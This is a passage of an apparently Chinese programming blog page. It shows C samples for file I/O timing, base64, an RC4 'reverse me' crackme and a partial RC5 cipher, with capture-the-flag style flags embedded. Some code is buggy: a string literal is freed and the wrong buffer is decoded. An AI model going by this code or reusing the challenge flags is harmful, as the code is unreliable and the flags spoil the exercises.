&lt; <span class="number">20000</span>; i++ )</div><div class="line">        <span class="built_in">list</span>[i] = (<span class="keyword">char</span>)(<span class="string">'z'</span>);</div><div class="line">    start=clock();</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"w+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numwritten = fwrite( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"Problem opening the file\n"</span> );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>( (stream = fopen( <span class="string">"fread.out"</span>, <span class="string">"r+t"</span> )) != <span class="literal">NULL</span> )  </div><div class="line">    &#123;</div><div class="line">        numread = fread( <span class="built_in">list</span>, <span class="keyword">sizeof</span>( <span class="keyword">char</span> ), <span class="number">20000</span>, stream );</div><div class="line">        fclose( stream );</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"File could not be opened\n"</span> );</div><div class="line">    &#125;</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fread all time：%d\n"</span>,end-start);</div><div class="line">    start=clock();</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_WRONLY|O_CREAT);</div><div class="line">    write(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    fd = open(<span class="string">"read.out"</span>, O_RDONLY);</div><div class="line">    size = read(fd, <span class="built_in">list</span>, <span class="keyword">sizeof</span>(<span class="built_in">list</span>));</div><div class="line">    close(fd);</div><div class="line">    end=clock();</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"read all time：%d\n"</span>,end-start);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;  </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;  </div><div class="line">  </div><div class="line"><span class="keyword">char</span> *table=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">int</span> count;  </div><div class="line">    <span class="keyword">char</span> *dst;  </div><div class="line">    <span class="keyword">long</span> tmp, buf;  </div><div class="line">    <span class="keyword">char</span> in[<span class="number">4</span>];  </div><div class="line">  </div><div class="line">    <span class="keyword">int</span> i, j;  </div><div class="line">  </div><div class="line">    count = <span class="built_in">strlen</span>(src) / <span class="number">3</span> + (<span class="built_in">strlen</span>(src) % <span class="number">3</span> ? <span class="number">1</span> : <span class="number">0</span>);  </div><div class="line">    dst = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>((count * <span class="number">4</span> + <span class="number">1</span>));  </div><div class="line">    <span class="built_in">memset</span>(dst, <span class="number">0</span>, count * <span class="number">4</span> + <span class="number">1</span>);  </div><div class="line">      </div><div class="line">  </div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; count; j++)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">memset</span>(in, <span class="number">0</span>, <span class="keyword">sizeof</span>(in));  </div><div class="line">        <span class="built_in">strncpy</span>(in, src + j * <span class="number">3</span>, <span class="number">3</span>);  </div><div class="line">  </div><div class="line">        buf = <span class="number">0</span>;  </div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(in); i++)  </div><div class="line">        &#123;  </div><div class="line">            tmp = (<span class="keyword">long</span>)in[i];  </div><div class="line">            tmp &lt;&lt;= (<span class="number">16</span> - i * <span class="number">8</span>);  </div><div class="line">            buf |= tmp;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)  </div><div class="line">        &#123;  </div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>(in) + <span class="number">1</span> &gt; i)  </div><div class="line">            &#123;  </div><div class="line">                tmp = buf &gt;&gt; (<span class="number">18</span> - <span class="number">6</span> * i);  </div><div class="line">                tmp &amp;= <span class="number">0x3f</span>;  </div><div class="line">                dst[j * <span class="number">4</span> + i] = table[tmp];  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">else</span>  </div><div class="line">            &#123;  </div><div class="line">                dst[j * <span class="number">4</span> + i] = <span class="string">'='</span>;  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="keyword">return</span> dst;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *src)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">int</span> count, len;  </div><div class="line">    <span class="keyword">char</span> *dst;  </div><div class="line">      </div><div class="line">    <span class="keyword">long</span> tmp, buf;  </div><div class="line">    <span class="keyword">int</span> i, j, k;  </div><div class="line">    <span class="keyword">char</span> in[<span class="number">5</span>];  </div><div class="line">    len = <span class="built_in">strlen</span>(src);  </div><div class="line">    count = len / <span class="number">4</span>;  </div><div class="line">      </div><div class="line">    dst = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(count * <span class="number">3</span> + <span class="number">1</span>);  </div><div class="line">    <span class="built_in">memset</span>(dst, <span class="number">0</span>, count * <span class="number">3</span> + <span class="number">1</span>);  </div><div class="line">  </div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; count; j++)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">memset</span>(in, <span class="number">0</span>, <span class="keyword">sizeof</span>(in));  </div><div class="line">        <span class="built_in">strncpy</span>(in, src + j * <span class="number">4</span>, <span class="number">4</span>);  </div><div class="line">  </div><div class="line">        buf = <span class="number">0</span>;  </div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)  </div><div class="line">        &#123;  </div><div class="line">            tmp = (<span class="keyword">long</span>)in[i];  </div><div class="line">            <span class="keyword">if</span>(tmp == <span class="string">'='</span>)  </div><div class="line">            &#123;  </div><div class="line">                tmp = <span class="number">0</span>;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">else</span>  </div><div class="line">            &#123;  </div><div class="line">                <span class="keyword">for</span>(k = <span class="number">0</span>; ; k++)  </div><div class="line">                &#123;  </div><div class="line">                    <span class="keyword">if</span>(table[k] == tmp)  </div><div class="line">                        <span class="keyword">break</span>;  </div><div class="line">                &#125;  </div><div class="line">                tmp = k;  </div><div class="line">            &#125;  </div><div class="line">            tmp &lt;&lt;= (<span class="number">18</span> - i * <span class="number">6</span>);  </div><div class="line">            buf |= tmp;  </div><div class="line">              </div><div class="line">        &#125;  </div><div class="line">  </div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)  </div><div class="line">        &#123;  </div><div class="line">            tmp = buf &gt;&gt; (<span class="number">16</span> - i * <span class="number">8</span>);  </div><div class="line">            tmp &amp;= <span class="number">0xff</span>;  </div><div class="line">            dst[j * <span class="number">3</span> + i] = tmp;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="keyword">return</span> dst;  </div><div class="line">  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">char</span> *src, *dst;  </div><div class="line">    src = <span class="string">"flag&#123;y0u_knoW_Ba4e64&#125;"</span>;   </div><div class="line">    dst = base64_encode(src);  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, dst);  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, base64_decode(src));  </div><div class="line">    <span class="built_in">free</span>(src);</div><div class="line">    <span class="built_in">free</span>(dst);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> secret[] = <span class="string">"\xf8\xae\xe7\xd0\x53\xff\x32\xe5\x05\x7e\xa2"</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s,<span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</div><div class="line">        s[i]=i;</div><div class="line">        k[i]=key[i%Len];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</div><div class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</div><div class="line">        tmp=s[i];</div><div class="line">        s[i]=s[j];</div><div class="line">        s[j]=tmp;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s,<span class="keyword">unsigned</span> <span class="keyword">char</span>*Data,<span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</div><div class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</div><div class="line">    &#123;</div><div class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</div><div class="line">        j=(j+s[i])%<span class="number">256</span>;</div><div class="line">        tmp=s[i];</div><div class="line">        s[i]=s[j];<span class="comment">//交?换?s[x]和¨ªs[y]</span></div><div class="line">        s[j]=tmp;</div><div class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</div><div class="line">        Data[k]^=s[t];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">       </div><div class="line">    <span class="keyword">char</span> szKey[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;,szRC4[<span class="number">512</span>]=&#123;<span class="number">0</span>&#125;,IV[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> rc4key[<span class="number">256</span>] = <span class="string">"i_am_not_the_flag"</span>;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"input Key\n"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%11s"</span>,szKey);</div><div class="line">        <span class="built_in">strcpy</span>(szRC4,szKey);</div><div class="line">        rc4_init(IV,(<span class="keyword">char</span> *)rc4key,<span class="built_in">strlen</span>(rc4key));</div><div class="line">        rc4_crypt(IV,(<span class="keyword">char</span> *)szRC4,<span class="built_in">strlen</span>(szRC4));</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(szRC4,secret,<span class="keyword">sizeof</span>(secret))==<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"flag&#123;%s&#125;\r\n"</span>,szKey);</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"please reverse me!\r\n"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="rc5"><a href="#rc5" class="headerlink" title="rc5"></a>rc5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"><span class="keyword">int</span> w=<span class="number">16</span>;<span class="comment">//字长</span></div><div class="line"><span class="keyword">int</span> r=<span class="number">12</span>;<span class="comment">//12;//轮数12</span></div><div class="line"><span class="keyword">int</span> b=<span class="number">16</span>;<span class="comment">//密钥长度</span></div><div class="line"><span class="keyword">int</span> t=<span class="number">26</span>;<span class="comment">//2*r+2=12*2+2=26</span></div><div class="line"><span class="keyword">int</span> c=<span class="number">8</span>; <span class="comment">//b*8/w = 16*8/16</span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> FOURBYTEINT;<span class="comment">//四字节</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> TWOBYTEINT;<span class="comment">//2字节</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitialKey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* KeyK,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">generateChildKey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* KeyK,TWOBYTEINT* ChildKeyS)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encipher</span><span class="params">(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decipher</span><span class="params">(TWOBYTEINT* In,TWOBYTEINT* Out,TWOBYTEINT* S)</span></span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NoOfData  4</span></div><div class="line"><span class="comment">/**2、循环移位函数</span></div><div class="line"><span class="comment"> 由于在生成子密钥，加密，解密过程中都要进行循环移位，故要首先定义循环以为函数。</span></div><div class="line"><span class="comment"> * 循环左移和右移函数</span></div><div class="line"><span class="comment"> * x : 被循环的数</span></div><div class="line"><span class="comment"> * y : 将要循环的位数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTL(x,y) (((x)<span class="meta-string">&lt;&lt;(y&amp;(w-1))) | ((x)&gt;&gt;(w-(y&amp;(w-1)))))</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROTR(x,y) (((x)&gt;&gt;(y&amp;(w-1))) | ((x)&lt;&lt;(w-(y&amp;(w-1)))))</span></div><div class="line"></div><div class="line"><span class="comment">/**3、    初始密钥产生函数</span></div><div class="line"><span class="comment"> 生成一个初始的长度为b字节的密钥。</span></div><div class="line"><span class="comment"> 产生初始密钥的函数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitialKey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* KeyK,<span class="keyword">int</span> b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>;i&lt;b;i++)<span class="comment">//初始化</span></div><div class="line">    &#123;</div><div class="line">        KeyK[i]=<span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> intiSeed=<span class="number">3</span>;</div><div class="line">    KeyK[<span class="number">0</span>]=intiSeed;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;b;j++)<span class="comment">//生成</span></div><div class="line">    &#123;</div><div class="line">        KeyK[j] = (BYTE) ( ((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">3</span>,j))%(<span class="number">255</span>-j)));</div><div class="line">        <span class="comment">//KeyK[j] = (BYTE) ( ((int)(pow(double(3),j))%(255-j)));</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**4、    密钥扩展函数</span></div><div class="line"><span class="comment"> 由于需加密r轮，每轮需要两个子密钥，所以需要密钥扩展函数根据初始密钥来扩展出2r+2个子密钥。</span></div><div class="line"><span class="comment"> 产生子密钥的函数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">generateChildKey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* KeyK,TWOBYTEINT* ChildKeyS)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">//const double e = 2.718281828459;</span></div><div class="line">    <span class="comment">//const double Phia = 1.618033988749;</span></div><div class="line">    <span class="keyword">int</span> PW = <span class="number">47073</span>;<span class="comment">//0xb7e1;</span></div><div class="line">    <span class="keyword">int</span> QW = <span class="number">40503</span>;<span class="comment">//0x9e37;//genggai</span></div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    TWOBYTEINT L[c];</div><div class="line">    <span class="comment">//初始化数组S</span></div><div class="line">    ChildKeyS[<span class="number">0</span>]=PW;</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;t;i++)</div><div class="line">    &#123;</div><div class="line">        ChildKeyS[i]=(ChildKeyS[i<span class="number">-1</span>]+ QW);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">//将K数组转换为L数组</span></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;c;i++)<span class="comment">//初始化L数组c=8</span></div><div class="line">    &#123;</div><div class="line">        L[i]=<span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> u = w/<span class="number">8</span>;</div><div class="line">    <span class="keyword">for</span> (i=b<span class="number">-1</span>;i!=<span class="number">-1</span>; i--)<span class="comment">//转换，数组L每一元素长为32bit，数组K每一元素长为8bit</span></div><div class="line">    &#123;</div><div class="line">        L[i/u] = (L[i/u]&lt;&lt;<span class="number">8</span>)+KeyK[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;c;i++)<span class="comment">//16进制输出gaidong</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,L[i]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="comment">//产生子密钥，存储在ChildKeyS中</span></div><div class="line">    TWOBYTEINT A,B,X,Y;</div><div class="line">    A=B=X=Y=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>*t;i++)</div><div class="line">    &#123;</div><div class="line">        X = ChildKeyS[A] = ROTL(ChildKeyS[A]+X+Y,<span class="number">3</span>);</div><div class="line">        A = (A+<span class="number">1</span>) % t;</div><div class="line">        Y = L[B] = ROTL(L[B]+X+Y,(X+Y));</div><div class="line">        B = (B+<span class="number">1</span>) % c;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;t;i++)<span class="comment">//16进制输出</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%.4X "</span>,ChildKeyS[i]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">/**5、    加密函数</span></div><div class="line"><span class="comment"> 加密函数</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encipher</span><span class="params">(TWOBYTEINT * In,TWOBYTEINT * Out,TWOBYTEINT* S)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TWOBYTEINT X,Y; <span class="comment">//定义两个32位存储器</span></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;NoOfData;j+=<span class="number">2</span>)</div><div class="line">    &#123;</div><div class="line">        X = In[j]+S[<span class="number">0</span>];</div><div class="line">        Y = In[j+<span class="number">1</span>]+S[<span class="number">1</span>];</div><div class="line">        <span class="keyword">for</span>( i=<span 